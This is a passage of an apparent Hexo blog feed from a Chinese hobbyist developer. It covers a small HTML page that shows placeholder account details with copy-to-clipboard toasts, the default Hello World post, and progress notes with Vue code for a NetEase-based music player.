&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">200px</span>);</span></span><br><span class="line"><span class="language-css">          <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;Toast&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layout&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bigBox&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">myCopy</span>(<span class="params">id, info</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(pwdInfo[id][info]);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">showToast</span>(<span class="string">`复制成功：<span class="subst">$&#123;pwdInfo[id].name&#125;</span>的<span class="subst">$&#123;info&#125;</span>`</span>, <span class="number">1200</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> toastNumber = -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">showToast</span>(<span class="params">content, duration = <span class="number">1000</span></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      toastNumber++;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> toast = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;Toast&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> toastItem = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      toastItem.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;toast&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      toastItem.<span class="property">style</span>.<span class="property">top</span> = <span class="string">`<span class="subst">$&#123;toastNumber * <span class="number">65</span>&#125;</span>px`</span>;</span></span><br><span class="line"><span class="language-javascript">      toastItem.<span class="property">innerHTML</span> = <span class="comment">/*html*/</span> <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div class=&quot;content&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;svg style=&quot;width:23px;color: rgb(10, 194, 58);&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path fill=&quot;currentColor&quot; d=&quot;M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896m-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;span style=&quot;margin-left:5px&quot;&gt;<span class="subst">$&#123;content&#125;</span>&lt;/span&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      `</span>;</span></span><br><span class="line"><span class="language-javascript">      toast.<span class="title function_">appendChild</span>(toastItem);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 使用Promise来同步setTimeout</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">delay</span>(<span class="params">ms</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 显示toast</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 播放开始动画</span></span></span><br><span class="line"><span class="language-javascript">      toastItem.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;show-toast&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 等待 进入动画+duration 时间后播放关闭动画</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   toastItem.style.top = `$&#123;toastNumber * 65&#125;px`;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">delay</span>(duration + <span class="number">500</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        toastItem.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;hide-toast&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        toastNumber--;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 等待 进入动画+duration+出场动画 时间后播放移除节点</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">delay</span>(duration + <span class="number">500</span> + <span class="number">500</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (toastItem) &#123;</span></span><br><span class="line"><span class="language-javascript">          toastItem.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    bigBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.bigBox&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    pwdInfo.<span class="title function_">forEach</span>(<span class="function">(<span class="params">info</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> <span class="title function_">showInfo</span> = (<span class="params">category, tag</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> info[category]</span></span><br><span class="line"><span class="language-javascript">          ? <span class="comment">/*html*/</span> <span class="string">`&lt;a class=&quot;btn&quot; onclick=&quot;myCopy(<span class="subst">$&#123;info.id&#125;</span>, &#x27;<span class="subst">$&#123;category&#125;</span>&#x27; )&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    <span class="subst">$&#123;tag&#125;</span>:<span class="subst">$&#123;info[category]&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                &lt;/a&gt;`</span></span></span><br><span class="line"><span class="language-javascript">          : <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      bigBox.<span class="property">innerHTML</span> += <span class="comment">/*html*/</span> <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;div class=&quot;personBox&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            &lt;h3&gt;<span class="subst">$&#123;info.name&#125;</span>&lt;/h3&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            <span class="subst">$&#123;showInfo(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;Email&quot;</span>)&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            <span class="subst">$&#123;showInfo(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;Phone&quot;</span>)&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            <span class="subst">$&#123;showInfo(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;Password&quot;</span>)&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;/div&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pwd-js"><a href="#pwd-js" class="headerlink" title="pwd.js"></a>pwd.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pwdInfo = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="attr">phone</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="attr">phone</span>: <span class="string">&quot;222&quot;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;222&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">使用html原生实现展示账密，toast展示复制情况，点击复制到剪切板。</summary>
    
    
    
    <category term="html" scheme="https://www.bandao.ltd/categories/html/"/>
    
    
    <category term="html" scheme="https://www.bandao.ltd/tags/html/"/>
    
    <category term="密码管理" scheme="https://www.bandao.ltd/tags/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Hello World ！！！</title>
    <link href="https://www.bandao.ltd/hello.html"/>
    <id>https://www.bandao.ltd/hello.html</id>
    <published>2024-10-14T16:00:00.000Z</published>
    <updated>2024-11-04T03:12:49.881Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vue音乐播放器施工进度（2）</title>
    <link href="https://www.bandao.ltd/coding/vue/2.html"/>
    <id>https://www.bandao.ltd/coding/vue/2.html</id>
    <published>2022-07-22T14:30:00.000Z</published>
    <updated>2024-11-04T03:12:49.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2022-07-21-施工进度"><a href="#2022-07-21-施工进度" class="headerlink" title="2022_07_21 施工进度"></a>2022_07_21 施工进度</h2>    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1463391795&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h3 id="点击-http-vue-music-bandao-ltd-再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用"><a href="#点击-http-vue-music-bandao-ltd-再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用" class="headerlink" title="点击 http://vue_music.bandao.ltd 再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用"></a>点击 <a href="http://vue_music.bandao.ltd/">http://vue_music.bandao.ltd</a> 再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用</h3><h4 id="主要难点：本地要代理访问网易云的-api，线上则不需要自己代理（这里花了两个小时来更正"><a href="#主要难点：本地要代理访问网易云的-api，线上则不需要自己代理（这里花了两个小时来更正" class="headerlink" title="主要难点：本地要代理访问网易云的 api，线上则不需要自己代理（这里花了两个小时来更正"></a>主要难点：本地要代理访问网易云的 api，线上则不需要自己代理<code>（这里花了两个小时来更正</code></h4><h4 id="修复-bug：刷新导致-404"><a href="#修复-bug：刷新导致-404" class="headerlink" title="修复 bug：刷新导致 404"></a>修复 bug：刷新导致 404</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,<span class="comment">//这里填入你要请求的接口的前缀</span></span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,<span class="comment">//代理websocked</span></span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span>,<span class="comment">//虚拟的站点需要更管origin</span></span><br><span class="line">            <span class="attr">secure</span>: <span class="literal">true</span>,                   <span class="comment">//是否https接口</span></span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span><span class="comment">//重写路径</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// footerMusic.vue</span><br><span class="line"><span class="comment">&lt;!-- 本地使用这个，这里用了代理 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;audio ref=&quot;myAudio&quot; :src=&quot;`/api/song/media/outer/url?id=$&#123;playlist[playlistIndex].id&#125;.mp3`&quot;&gt;&lt;/audio&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 线上使用这个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&quot;myAudio&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:src</span>=<span class="string">&quot;`https://music.163.com/song/media/outer/url?id=$&#123;playlist[playlistIndex].id&#125;.mp3`&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="技术点-vuex"><a href="#技术点-vuex" class="headerlink" title="技术点 vuex"></a>技术点 vuex</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store/index.js</span></span><br><span class="line"><span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="title function_">updateIsBtnShow</span>(<span class="params">state, value</span>) &#123;</span><br><span class="line">      state.<span class="property">isBtnShow</span> = value</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">updatePlaylist</span>(<span class="params">state, value</span>) &#123;</span><br><span class="line">      state.<span class="property">playlist</span> = value</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">updatePlaylistIndex</span>(<span class="params">state, value</span>) &#123;</span><br><span class="line">      state.<span class="property">playlistIndex</span> = value</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// footerMusic.vue</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapMutations, mapState &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">        ...<span class="title function_">mapState</span>([<span class="string">&#x27;playlist&#x27;</span>, <span class="string">&#x27;playlistIndex&#x27;</span>, <span class="string">&#x27;isBtnShow&#x27;</span>]),</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">        ..<span class="title function_">mapMutations</span>([<span class="string">&#x27;updateIsBtnShow&#x27;</span>])</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2022-07-21-施工进度&quot;&gt;&lt;a href=&quot;#2022-07-21-施工进度&quot; class=&quot;headerlink&quot; title=&quot;2022_07_21 施工进度&quot;&gt;&lt;/a&gt;2022_07_21 施工进度&lt;/h2&gt;
    &lt;div class=&quot;tag-</summary>
      
    
    
    
    <category term="Vue前端" scheme="https://www.bandao.ltd/categories/Vue%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="网易云" scheme="https://www.bandao.ltd/tags/%E7%BD%91%E6%98%93%E4%BA%91/"/>
    
    <category term="vue" scheme="https://www.bandao.ltd/tags/vue/"/>
    
    <category term="工程" scheme="https://www.bandao.ltd/tags/%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="音乐播放器" scheme="https://www.bandao.ltd/tags/%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Vue音乐播放器施工进度（1）</title>
    <link href="https://www.bandao.ltd/coding/vue/1.html"/>
    <id>https://www.bandao.ltd/coding/vue/1.html</id>
    <published>2022-07-19T19:23:00.000Z</published>
    <updated>2024-11-04T03:12:49.887Z</updated>
    
    <content type="html"><![CDATA[<p>2022-07-20 03:29:47 星期三</p>    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1958557200&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <p>Daily 部分<br>音乐没开自动播放<br>好困啊，明天还要练车，绝了<br>此页面随时消失嗷，说不定那天我又把服务器重启了，ngnix 又开不了了，这个页面就 g 了<br>图片放在我另外一个网站上了也是随时会 g 掉<br>明天还要处理一堆拍的照片</p><hr><h2 id="2022-07-19-施工进度"><a href="#2022-07-19-施工进度" class="headerlink" title="2022_07_19 施工进度"></a>2022_07_19 施工进度</h2><h3 id="点击-http-vue-music-bandao-ltd-再点击歌单"><a href="#点击-http-vue-music-bandao-ltd-再点击歌单" class="headerlink" title="点击 http://vue_music.bandao.ltd 再点击歌单"></a>点击 <a href="http://vue_music.bandao.ltd/">http://vue_music.bandao.ltd</a> 再点击歌单</h3><p><del>网址是 <a href="http://vue_music.bandao.ltd/itemMusic?id=5349291073">http://vue_music.bandao.ltd/itemMusic?id=5349291073</a> （好像直接点击进不去耶，显示 404 我也没搞懂）</del></p><p><img src="/assets/pic/2022_07_19%E6%96%BD%E5%B7%A5%E9%A1%B5%E9%9D%A2.png" alt="施工页面"></p><h4 id="今天做的事情：上面的歌单信息展示部分写了-200-多行，大部分都是样式，写得我自己都要看不懂了"><a href="#今天做的事情：上面的歌单信息展示部分写了-200-多行，大部分都是样式，写得我自己都要看不懂了" class="headerlink" title="今天做的事情：上面的歌单信息展示部分写了 200 多行，大部分都是样式，写得我自己都要看不懂了"></a>今天做的事情：上面的歌单信息展示部分写了 200 多行，大部分都是样式，写得我自己都要看不懂了</h4><p>已知 bug ：</p><ol><li>直接点击链接或者再次刷新会 404，但是本地运行没有这个情况</li><li>歌单描述部分的箭头需要更改样式</li><li>pc 端显示大概率异常</li></ol><p>需要努力的地方：</p><ol><li>还需要了解一下 flex 布局</li><li>加快学习的速度啊</li><li>（原神活动主要都肝完了要好好学习了）</li></ol><h4 id="下面是代码部分"><a href="#下面是代码部分" class="headerlink" title="下面是代码部分"></a>下面是代码部分</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;img :src=&quot;playlist.coverImgUrl&quot; alt=&quot;&quot; class=&quot;bgImg&quot;&gt;</span><br><span class="line">    &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;itemMusicTop&quot;&gt;</span><br><span class="line">        &lt;van-col span=&quot;8&quot; class=&quot;itemLeft&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;arrow-left&quot; @click=&quot;$router.go(-1)&quot; size=&quot;25&quot; /&gt;</span><br><span class="line">            